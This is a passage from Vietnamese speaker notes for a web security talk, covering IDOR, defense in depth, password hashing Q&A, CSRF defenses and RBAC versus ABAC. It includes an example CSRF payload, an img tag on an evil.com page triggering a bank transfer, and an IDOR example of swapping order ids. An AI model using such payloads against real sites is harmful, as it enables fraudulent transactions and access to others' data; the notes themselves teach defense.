- "Đổi `/api/orders/1234` thành `/5678` → server trả **đơn của người khác**, vì nó **không kiểm sở hữu.**"
- "**Fix: ép authorization *server-side* mọi request · không tin role/id từ client — suy lại từ session · test kịch bản 'đổi id trên URL' · default deny.**"
- **Câu chốt:** "**Thứ duy nhất chắn giữa dữ liệu của A và B là một check sở hữu phía server.**"

> 📖 **HIỂU SÂU — IDOR là lỗi authz, không phải authn:**
> - User **đã đăng nhập hợp lệ** (authn ok). Lỗi nằm ở chỗ server **không kiểm: 'tài nguyên này có thuộc về user này không?'** (authz). Đăng nhập đúng ≠ được xem mọi thứ.
> - **Vì sao hay dính:** dev hay nghĩ "user không thấy link tới đơn người khác trên UI nên an toàn" → nhưng kẻ tấn công **đổi thẳng id trên URL/API**, không cần UI. → **không bao giờ dựa vào client che giấu**; mọi quyền phải kiểm **server-side**.
> - **'không tin role/id từ client':** nếu client gửi `?role=admin` hay `userId=...` và server tin theo → kẻ xấu chỉ việc sửa request. Luôn **suy danh tính từ session/token đã verify**, không từ tham số client gửi.
> - **default deny:** mặc định **từ chối**, chỉ cho qua khi có grant rõ ràng. (Ngược với "default allow" — quên check là lọt.)

### SLIDE 5.6 — "Principles & In Our System" (defense in depth) `~1 phút`
**MÀN HÌNH:** sơ đồ nhiều lớp: rate limit → authn → authz → validation → logging → resource.

**NÓI:**
- "4 thói quen: **never trust client input · least privilege · defense in depth · secure secrets.**"
- "Trong hệ của mình: **password hash bcrypt/Argon2 · JWT validate ở API · HTTPS mọi nơi · authz ép ở backend route.**"
- **Câu chốt:** "**Không lớp nào được tin một mình — lọt lớp này thì lớp sau bắt.**"

> 📖 **HIỂU SÂU — defense in depth:** không có lớp nào hoàn hảo, nên **xếp nhiều lớp**: rate limit chặn brute-force/DDoS → authn kiểm danh tính → authz kiểm quyền → validation kiểm input → logging để truy vết. Nếu một lớp lọt (vd quên một check authz), lớp khác vẫn giảm thiểu. *Đời thường:* ngân hàng không chỉ có một cửa khoá — còn camera, két sắt, bảo vệ, mã PIN... lọt cái này còn cái kia.

**Checkpoint (nếu có time):** câu hỏi password hashing — đáp án **bcrypt/Argon2** vì cố tình chậm.

**HANDOFF Section 6:** "Đó là nền tảng. Cuối cùng, ba mảnh ghép hay bị bỏ quên."

---

## PHẦN C — Q&A Section 5

- **Salt để làm gì?** → Chuỗi ngẫu nhiên riêng mỗi user thêm vào trước khi hash → hai người cùng mật khẩu vẫn ra hash khác nhau → vô hiệu **rainbow table**.
- **bcrypt vs Argon2?** → Cùng "chậm có chủ đích". Argon2 mới hơn, *memory-hard* chống cả GPU/ASIC. Cả hai đều ổn; **Argon2id** được khuyến nghị hiện đại.
- **Sao SHA-256 nhanh lại là điểm yếu cho password?** → Nhanh = attacker thử được nhiều hơn (hàng tỉ/giây). Password hashing cần *chậm* để brute-force trở nên đắt.
- **Parameterized query khác escaping thế nào?** → Parameterized tách hẳn *code* và *data* ở tầng driver/DB — input không bao giờ được parse như SQL. Escaping thủ công dễ sót.
- **CSP là gì?** → Content-Security-Policy: header bảo browser chỉ chạy script từ nguồn cho phép → giảm mạnh tác động XSS.
- **IDOR khác broken access control thế nào?** → IDOR là một *dạng cụ thể* của broken access control (truy cập trực tiếp object qua id mà không kiểm quyền sở hữu).
- **Hash với salt rồi có cần "pepper" không?** → Pepper = secret chung toàn hệ thống (để trong KMS, không trong DB) trộn thêm. Tuỳ chọn nâng cao; salt là bắt buộc, pepper là thêm.

---

# ════════════════════════════════════════
# SECTION 6 — GAPS: CSRF + RBAC/ABAC (~7 phút)
# ════════════════════════════════════════

> ✂️ Phần OIDC đã gỡ (đã nói hôm trước). Nếu bị hỏi: *"OIDC mình đã đi kỹ ở phần danh tính rồi — tóm lại nó thêm ID token cho biết user là ai; access token mới để gọi API."* Rồi quay lại CSRF.

## PHẦN A — Kiến thức nền PHẢI nắm cứng

1. **CSRF (Cross-Site Request Forgery):** Site độc dụ **browser nạn nhân** gửi một request **có credential** tới API của bạn. **Browser tự đính kèm cookie**, nên server tưởng là hợp lệ.
   - **Fix:** `SameSite=Strict/Lax` · **CSRF token** · **`Authorization: Bearer` tự nhiên miễn nhiễm** (trang cross-site không set được custom header).

2. **RBAC vs ABAC — hai cách quyết định "ai được làm gì":**
   - **RBAC (Role-Based):** quyền gắn **role**, role gán user. Đơn giản → hầu hết app bắt đầu ở đây. Nhược: **role phình nhanh**.
   - **ABAC (Attribute-Based):** quyền tính từ **policy trên thuộc tính** (user/resource/env). Linh hoạt nhưng **khó debug/audit**.
   - **Quy tắc ngón cái:** bắt đầu RBAC; chuyển ABAC khi role không diễn đạt nổi policy (vd *"editor chỉ sửa bài CỦA CHÍNH MÌNH"*).

---

## PHẦN B — Kịch bản từng slide

### SLIDE 6.1 — "The Browser Sends Cookies for You" (CSRF) `~2 phút`
**MÀN HÌNH:** prose + sơ đồ tấn công (malicious page → browser auto cookie → bank → 💥 transfer).

**NÓI:**
- **Mở bằng callout (đọc câu vàng trên slide):** "**Trình duyệt tự đính kèm cookie của bạn vào MỌI request tới một site — bất kể trang nào châm ngòi. CSRF lợi dụng đúng cái đó.**"
- **CHỈ ví dụ:** "Bạn đang đăng nhập bank. Trang độc nhúng `<img src=bank.com/transfer?...>`. Browser bắn request **kèm session cookie** — và bank xử lý vì tưởng là chính bạn."
- **CHỈ sơ đồ (lồng phòng thủ — giống 3 lớp XSS):** "Chuỗi tấn công ở giữa, 3 cách chặn màu xanh: **`SameSite=Strict`** và **Bearer header** chặn ngay bước *cookie bị đính kèm*; **CSRF token** chặn ở *server* vì kẻ tấn công không cung cấp được token."
- **Câu chốt (cầu nối):** "Đây chính là lý do ở lecture JWT mình để **`SameSite=Strict`** cho refresh cookie — không phải cho đẹp, mà là chống CSRF ngay trong cookie."

> 📖 **HIỂU SÂU — toàn bộ CSRF trong 1 câu: *"trình duyệt tự gửi cookie giùm bạn"*:**
> - **Nền tảng:** khi anh đăng nhập `bank.com`, browser lưu cookie `session=abc`. Quy tắc của browser: *bất kỳ request nào đi tới `bank.com`, **tự động** đính kèm cookie đó* — **bất kể request được châm ngòi từ trang nào**. Tức cookie gắn theo **điểm đến** (bank.com), **không** theo **nơi xuất phát** (trang anh đang mở).
> - **Kẻ tấn công lợi dụng đúng cái tự động đó:** anh đang đăng nhập bank (cookie còn sống). Anh mở `evil.com`. Trang đó nhúng `<img src="https://bank.com/transfer?to=attacker&amount=1000">`. Browser thấy thẻ img → tự gửi request tới `bank.com` → **vì điểm đến là bank.com nên tự kèm cookie session của anh** → bank thấy cookie hợp lệ → tưởng chính anh → chuyển tiền. 💥
> - **Vì sao server không phân biệt được?** Request giả mạo và request thật **trông y hệt nhau** (cùng cookie, cùng URL). Kẻ tấn công **không cần biết mật khẩu, không cần trộm cookie** — chỉ **mượn** cái cookie browser tự gửi.
> - **Tên gọi:** **Cross-Site** (request từ site khác) + **Request Forgery** (giả mạo request như thể user chủ động).
> - **3 phòng thủ:**
>   - **`SameSite=Strict/Lax`:** bảo browser *"cookie này KHÔNG gửi khi request đến từ site khác"* → request từ evil.com **không kèm cookie** → bank thấy không session → từ chối. (Cách chính, dễ nhất.)
>   - **CSRF token:** server phát secret ngẫu nhiên theo session, nhúng vào form hợp lệ; mọi request mutating phải gửi lại đúng token. evil.com **không biết token** → bị chặn.
>   - **`Authorization: Bearer`:** API dùng token trong **header** thì miễn nhiễm CSRF — vì browser **chỉ tự kèm cookie, KHÔNG tự kèm header**; evil.com không set được header thay anh.

**CHUYỂN Ý:** "Xem nó sống động qua demo."

### SLIDE 6.2 — DEMO: CSRF Sandbox `~1 phút`
**NÓI:** "Mình giả lập một request cross-site giả mạo → nó lọt. Giờ bật **`SameSite=Strict`** → request bị chặn ngay. **Cùng một tấn công, một dòng phòng thủ là khác kết quả.**"

> 📖 **CÁCH DEMO (CSRF Sandbox — đã fix):**
> 1. Để `SameSite = **None**`, bấm nút bên khung **cross-site (evil.example)** → kết quả **đỏ: "cookie sent — CSRF succeeds"** (tấn công lọt).
> 2. Đổi sang `SameSite = **Lax**` rồi **Strict**, bấm lại → **xanh: "cookie blocked — CSRF prevented"** (bị chặn).
> 3. Bấm nút bên khung **same-origin (bank.example)** → cookie luôn gửi (vì cùng site, `SameSite` không chặn first-party) — minh hoạ `SameSite` chỉ chặn **cross-site**, không phá UX bình thường.
> - Câu chốt: *"chỉ một thuộc tính cookie `SameSite` đã quyết định cookie có 'đi giùm' sang request cross-site hay không."*

### SLIDE 6.3 — "Modeling Permissions" (RBAC vs ABAC) `~2 phút`
**NÓI:**
- "AuthZ nói *ai được làm gì* — nhưng **hệ thống quyết định bằng cách nào?** Đó là RBAC và ABAC."
- "**RBAC:** quyền gắn role, role gán user — `admin/editor/viewer`. **Đơn giản, hầu hết app bắt đầu ở đây.** Nhược: **role phình nhanh** theo ca ngoại lệ."
- "**ABAC:** quyền tính từ **policy trên thuộc tính** — `allow if user.dept == resource.dept AND hour < 18`. Linh hoạt hơn nhưng **khó debug/audit.**"
- **Câu chốt:** "**Quy tắc ngón cái: bắt đầu RBAC; chuyển ABAC khi role không diễn đạt nổi policy** — ví dụ kinh điển *'editor chỉ được sửa bài của chính mình'*."

> 📖 **HIỂU SÂU — vì sao RBAC "phình" và ABAC "khó debug":**
> - **RBAC** trả lời quyền dựa **chỉ trên role** (`user → role → permissions`). Tốt khi quyền tĩnh, ít ngoại lệ. Nhưng khi xuất hiện quyền theo **quan hệ/ngữ cảnh** (sở hữu, cùng phòng ban, theo tier gói, theo giờ), role bắt đầu nhân bản vô tội vạ: `editor`, `editor-phòng-A`, `editor-bài-của-mình`, `editor-org-X-tier-pro`... → **bùng nổ số role**, không quản nổi.
> - **ABAC** trả lời quyền bằng **policy đánh giá thuộc tính theo từng request**: `allow if user.id == resource.owner_id AND user.role == 'editor'`. Một dòng diễn đạt được "editor sửa bài của mình" mà RBAC cần vô số role. Đổi lại: logic nằm rải trong policy → **khó nhìn ra "ai có quyền gì"**, khó audit/test.
> - **Quan trọng khi present:** không phải "ABAC tốt hơn RBAC". Mà là **RBAC trước cho đơn giản; thêm attribute/chuyển ABAC khi role không diễn đạt nổi.** Thực tế hay là **lai**: RBAC làm xương sống + vài attribute check cho ngoại lệ.

### SLIDE 6.4 — "Two Ways to Decide" (sơ đồ) `~1 phút`
**MÀN HÌNH:** sơ đồ RBAC (user→role→permissions→allow/deny) vs ABAC (nhiều attrs→policy engine→allow/deny).

**NÓI:**
- **CHỈ RBAC:** "RBAC đi theo chuỗi cố định: **user → role → permissions.**"
- **CHỈ ABAC:** "ABAC nạp **nhiều thuộc tính** — user, resource, environment — vào **policy engine** quyết định **theo từng request.**"
- **Câu chốt:** "RBAC = chuỗi cố định, dễ hiểu. ABAC = quyết định theo ngữ cảnh, mạnh nhưng phức tạp hơn."

**Checkpoint (nếu có time):** ownership ('editor sửa bài của mình' → ABAC) · multi-tenant SaaS (role-per-org + tier → ABAC territory).

**KẾT TOÀN PHẦN:** "Vậy là từ *máy xác thực máy*, qua *các lỗ hổng kinh điển*, tới *CSRF và mô hình phân quyền*. Đây là những mảnh ghép khép lại bức tranh Authentication & Security. Cảm ơn cả nhà."

---

## PHẦN C — Q&A Section 6

- **CSRF khác XSS thế nào?** → XSS = chạy *code lạ* trong browser nạn nhân. CSRF = lợi dụng *phiên hợp lệ sẵn có* để gửi request giả mạo — không cần chạy code trong trang bạn. Khác nhau hoàn toàn.
- **Sao Bearer token miễn nhiễm CSRF còn cookie thì không?** → Browser **tự** đính kèm cookie theo origin đích; còn header `Authorization` phải do JS **chủ động set** trên cùng origin → trang độc không set được.
- **`SameSite=Lax` vs `Strict`?** → `Lax` vẫn gửi cookie với điều hướng top-level GET (đỡ vỡ UX), chặn phần lớn CSRF. `Strict` chặt hơn, không gửi với mọi cross-site. Refresh/critical cookie nên `Strict`.
- **CSRF token hoạt động sao?** → Server phát secret ngẫu nhiên theo session, nhúng vào form/header; mọi request mutating phải gửi lại đúng token → trang độc không biết token → bị chặn.
- **API thuần Bearer có cần CSRF token không?** → Thường không, vì đã miễn nhiễm CSRF. CSRF token chủ yếu cho app dùng **cookie** session.
- **RBAC scale tới đâu thì gãy?** → Khi xuất hiện quyền theo *quan hệ* (sở hữu, cùng phòng ban, theo tier) — role bắt đầu nhân bản `editor-of-doc-1`, `editor-of-doc-2`… → đó là lúc cần ABAC (hoặc RBAC + attribute).
- **Multi-tenant SaaS nên dùng gì?** → ABAC territory (hoặc RBAC scoped theo org + attribute): quyền phụ thuộc org membership, role-trong-org, và tier gói — một bộ role phẳng không diễn đạt nổi.

---

# ════════════════════════════════════════
# CHECKLIST TRƯỚC KHI LÊN (2 phút)
# ════════════════════════════════════════

- [ ] **Section 4 — câu thuộc lòng:** *OAuth = cách lấy token · JWT = token trông thế nào · policy Service B = caller được làm gì.* Và: **ranh giới mạng ≠ danh tính.**
- [ ] **Section 4 — Validation vs Authorization** là hai việc khác nhau (chữ ký/iss/aud/exp ≠ scope→endpoint).
- [ ] **Section 4 — chỉ bên gọi mới login; bên kiểm chỉ tải JWKS rồi verify local.**
- [ ] **Section 5 — câu thuộc lòng:** *Hashing một chiều cho password (bcrypt/Argon2, chậm + salt) · Encryption hai chiều cho dữ liệu (AES + KMS). Không MD5/SHA cho password.*
- [ ] **Section 5 — công thức OWASP:** *input không tin được chạm sink nhạy cảm → làm sạch ở giữa.* (SQLi/XSS/IDOR đều theo nó.)
- [ ] **Section 6 — câu thuộc lòng:** *CSRF = browser tự gửi cookie giùm bạn; Bearer header miễn nhiễm; SameSite=Strict là phòng thủ.* Và *RBAC trước, ABAC khi role không diễn đạt nổi (ownership).*
- [ ] **2 demo phải bấm thử trước:** XSS Sandbox (security-fundamentals) + CSRF Sandbox (gaps) — đã fix, mở web bấm 1 lượt cho chắc.
- [ ] **OIDC đã gỡ khỏi Section 6** — nếu bị hỏi, nhắc 1 câu rồi quay lại. ĐỪNG nói lại slide.
- [ ] Thuộc 3 câu **handoff** giữa các section (4→5→6).
- [ ] Nói **chậm** ở: "Base64 là encoding không phải mã hóa" (4.4), "không MD5/SHA cho password" (5.2), "browser tự đính kèm cookie" (6.1).
